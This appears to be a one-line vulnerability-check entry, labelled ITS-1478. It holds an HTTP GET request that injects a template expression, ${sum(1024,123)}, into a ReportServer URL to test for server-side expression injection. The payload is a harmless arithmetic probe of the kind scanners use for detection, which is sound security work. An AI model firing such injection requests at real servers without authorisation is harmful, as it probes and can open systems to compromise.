# Vulnerable: ITS-1478
GET /webroot/decision/view/ReportServer?{{string}}=&n=${sum(1024,123)}
